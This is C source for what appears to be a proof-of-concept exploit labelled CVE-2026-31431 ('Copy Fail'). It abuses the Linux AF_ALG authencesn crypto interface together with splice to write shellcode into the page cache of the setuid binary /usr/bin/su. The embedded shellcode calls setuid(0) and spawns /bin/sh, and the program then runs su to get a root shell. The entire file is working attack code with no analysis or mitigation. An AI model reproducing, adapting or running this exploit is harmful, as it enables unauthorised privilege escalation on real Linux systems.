#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <elf.h>
#include <errno.h>
#include <stdint.h>

#ifndef AF_ALG
#define AF_ALG 38
#endif

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif

#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif

#ifndef ALG_SET_AEAD_ASSOCLEN
#define ALG_SET_AEAD_ASSOCLEN 4
#endif

#ifndef ALG_SET_AEAD_AUTHSIZE
#define ALG_SET_AEAD_AUTHSIZE 5
#endif

#ifndef ALG_OP_DECRYPT
#define ALG_OP_DECRYPT 0
#endif

#define ASSOCLEN 12
#define AUTHSIZE 32
#define TARGET "/usr/bin/su"

struct sockaddr_alg {
    unsigned short salg_family;
    unsigned char salg_type[14];
    unsigned int salg_feat;
    unsigned int salg_mask;
    unsigned char salg_name[64];
};

static const unsigned char sc[] = {
    0x31, 0xff,
    0xb8, 0x69, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0x31, 0xd2,
    0x52,
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
    0x50,
    0x48, 0x89, 0xe7,
    0x52,
    0x57,
    0x48, 0x89, 0xe6,
    0xb8, 0x3b, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0x90, 0x90
};
#define SC_LEN sizeof(sc)

static off_t vaddr_to_foff(int fd, Elf64_Addr vaddr)
{
    Elf64_Ehdr ehdr;
    if (pread(fd, &ehdr, sizeof(ehdr), 0) != (ssize_t)sizeof(ehdr))
        return -1;
    Elf64_Phdr phdr;
    for (uint16_t i = 0; i < ehdr.e_phnum; i++) {
        if (pread(fd, &phdr, sizeof(phdr),
                  ehdr.e_phoff + i * ehdr.e_phentsize) != (ssize_t)sizeof(phdr))
            return -1;
        if (phdr.p_type == PT_LOAD &&
            vaddr >= phdr.p_vaddr &&
            vaddr < phdr.p_vaddr + phdr.p_filesz)
            return (off_t)(phdr.p_offset + (vaddr - phdr.p_vaddr));
    }
    return -1;
}

static int do_write(int algfd, int tgtfd, off_t offset, uint32_t val)
{
    int fd = accept(algfd, NULL, 0);
    if (fd < 0) return -1;

    unsigned char aad[ASSOCLEN];
    memset(aad, 0x41, ASSOCLEN);
    memcpy(aad + 4, &val, 4);

    unsigned int op = ALG_OP_DECRYPT;
    unsigned int alen = ASSOCLEN;

    union {
        struct cmsghdr hdr;
        char buf[CMSG_SPACE(sizeof(unsigned int)) * 2];
    } ctrl;
    memset(&ctrl, 0, sizeof(ctrl));

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    struct iovec iov;
    iov.iov_base = aad;
    iov.iov_len = ASSOCLEN;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = ctrl.buf;
    msg.msg_controllen = sizeof(ctrl.buf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned int));
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_OP;
    memcpy(CMSG_DATA(cmsg), &op, sizeof(op));

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned int));
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    memcpy(CMSG_DATA(cmsg), &alen, sizeof(alen));

    if (sendmsg(fd, &msg, MSG_MORE) < 0) {
        close(fd);
        return -1;
    }

    int pfd[2];
    if (pipe(pfd) < 0) {
        close(fd);
        return -1;
    }

    off_t off = offset;
    ssize_t n = splice(tgtfd, &off, pfd[1], NULL, AUTHSIZE, 0);
    if (n != AUTHSIZE) {
        close(pfd[0]);
        close(pfd[1]);
        close(fd);
        return -1;
    }

    n = splice(pfd[0], NULL, fd, NULL, AUTHSIZE, 0);
    close(pfd[0]);
    close(pfd[1]);

    if (n != AUTHSIZE) {
        close(fd);
        return -1;
    }

    unsigned char outbuf[256];
    recv(fd, outbuf, sizeof(outbuf), 0);
    close(fd);
    return 0;
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] CVE-2026-31431 PoC (Copy Fail)\n");

    int tgtfd = open(TARGET, O_RDONLY);
    if (tgtfd < 0) {
        perror("open " TARGET);
        return 1;
    }

    Elf64_Ehdr ehdr;
    if (pread(tgtfd, &ehdr, sizeof(ehdr), 0) != (ssize_t)sizeof(ehdr)) {
        perror("read elf");
        close(tgtfd);
        return 1;
    }

    if (ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
        fprintf(stderr, "Not 64-bit ELF\n");
        close(tgtfd);
        return 1;
    }

    off_t entry_foff = vaddr_to_foff(tgtfd, ehdr.e_entry);
    if (entry_foff < 0) {
        fprintf(stderr, "Cannot resolve entry point\n");
        close(tgtfd);
        return 1;
    }
    printf("[*] %s entry @ file offset 0x%lx\n", TARGET, (unsigned long)entry_foff);

    int algfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (algfd < 0) {
        perror("socket AF_ALG");
        close(tgtfd);
        return 1;
    }

    struct sockaddr_alg sa;
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strncpy((char *)sa.salg_type, "aead", sizeof(sa.salg_type));
    strncpy((char *)sa.salg_name,
            "authencesn(hmac(sha256),cbc(aes))", sizeof(sa.salg_name));

    if (bind(algfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind authencesn");
        close(algfd);
        close(tgtfd);
        return 1;
    }

    unsigned char keyblob[8 + 16 + 32];
    memset(keyblob, 0, sizeof(keyblob));
    keyblob[0] = 8;
    keyblob[2] = 1;
    keyblob[7] = 16;

    if (setsockopt(algfd, SOL_ALG, ALG_SET_KEY, keyblob, sizeof(keyblob)) < 0) {
        perror("setsockopt key");
        close(algfd);
        close(tgtfd);
        return 1;
    }

    unsigned int authsize = AUTHSIZE;
    if (setsockopt(algfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE,
                   &authsize, sizeof(authsize)) < 0) {
        perror("setsockopt authsize");
        close(algfd);
        close(tgtfd);
        return 1;
    }

    printf("[*] Patching page cache (%zu bytes, %zu writes)\n",
           (size_t)SC_LEN, (SC_LEN + 3) / 4);

    size_t num_writes = (SC_LEN + 3) / 4;
    for (size_t i = 0; i < num_writes; i++) {
        uint32_t val = 0;
        size_t nbytes = SC_LEN - i * 4;
        if (nbytes > 4) nbytes = 4;
        memcpy(&val, sc + i * 4, nbytes);

        if (do_write(algfd, tgtfd, entry_foff + (off_t)(i * 4), val) < 0) {
            fprintf(stderr, "[-] Write #%zu failed\n", i);
            close(algfd);
            close(tgtfd);
            return 1;
        }
        printf(".");
    }
    printf("\n");

    close(tgtfd);
    close(algfd);

    printf("[+] Executing %s\n", TARGET);
    execl(TARGET, TARGET, NULL);
    perror("execl");
    return 1;
}
